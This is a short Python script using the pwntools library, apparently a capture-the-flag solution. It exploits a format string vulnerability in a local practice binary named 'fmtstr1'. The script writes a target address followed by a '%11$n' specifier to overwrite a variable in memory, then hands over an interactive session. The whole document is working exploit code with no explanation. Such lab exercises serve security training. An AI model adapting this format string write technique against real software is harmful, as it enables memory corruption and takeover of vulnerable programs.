from pwn import *
 
conn=process('./fmtstr1')
e=ELF('./fmtstr1')
x_addr=0x0804A02C                                      
payload=p32(x_addr)+b"%11$n"
conn.sendline(payload)
conn.interactive()
